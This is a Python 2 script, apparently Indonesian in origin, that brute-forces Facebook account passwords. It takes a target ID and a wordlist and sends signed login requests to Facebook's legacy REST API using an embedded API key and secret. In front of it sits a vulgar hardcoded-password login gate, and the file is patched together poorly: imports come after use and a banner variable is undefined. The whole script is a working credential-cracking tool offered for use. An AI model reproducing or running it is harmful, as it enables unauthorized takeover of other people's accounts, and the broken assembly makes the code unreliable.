hgg## fbbrute.py - Facebook Brute Force
# -*- coding: utf-8 -*-
print ("\033[1;32mSilahkan Masukkan Username & Password Anda Ya Ngentod")
 
print ("\033[1;32matau silahkan Hubungi zx wazaowsky ")
 
username = 'marioXploit'      
 
password = '*#*#*#*#*#'
 
 
 
def restart():
 
    ngulang = sys.executable
 
    os.execl(ngulang, ngulang, *sys.argv)
 
 
 
def main():
 
    uname = raw_input("username : ")
 
    if uname == username:
 
        pwd = raw_input("password : ")
 
 
 
        if pwd == password:
 
           
 
            sys.exit()
 
 
 
        else:
 
            print "\033[1;32mMaaf Masukkan password Anda salah... [?]\033[00m"
 
            print "Silahkan segera log-in kembali...!!\n"
 
            restart()
 
 
 
    else:
 
        print "\033[1;32mMaaf Masukkan Username Anda salah... [?]\033[00m"
 
        print "Silahkan segera log-in kembali...!!\n"
 
        restart()
 
 
 
try:
 
    main()
 
except KeyboardInterrupt:
 
    os.system('clear')
 
    restart()

import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

logo = " \x1b[1;92m█████████\n \x1b[1;92m█▄█████▄█         \x1b[1;97m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[1;92m█ \x1b[1;93m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[1;92m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;92m█ \x1b[1;93m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[1;93mMarioV2\n \x1b[1;92m█████████         \x1b[1;97m«==========✧==========»\n \x1b[1;92m ██ ██\n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mReCode   \x1b[1;91m:  \x1b[1;96m J4CKW!EL_-  \x1b[1;97m                   ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mAuthor   \x1b[1;91m:  \x1b[1;92m \x1b[92mhttp://marioxploit.home.blog\x1b[    \x1b[1;97m ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mFB       \x1b[1;91m:   \x1b[1;92\x1b[92mhttps://fb.me/Asedekontol\x1b[     \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n\x1b[1;92m[*] Silahkan Login Operamini Agar Tidak Checkpoint\n'
print("[+] Facebook Brute Force\n")
userid = raw_input("[*] Enter [Email|Phone|Username|ID]: ")
try:
	passlist = raw_input("[*] Set PATH to passlist: ")
	if os.path.exists(passlist) != False:
		print(__banner__)
		print(" [+] Account to crack : {}".format(userid))
		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] Cracking, please wait ...")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[+] Password found .. !!")
				print("\n[+] Password : {}".format(passwd.strip()))
				break
		print("\n\n[!] Done .. !!")
	else:
		print("FbPsikopat: error: No such file or directory")
except KeyboardInterrupt:
	print("FbPsikopat: error: Keyboard interrupt")
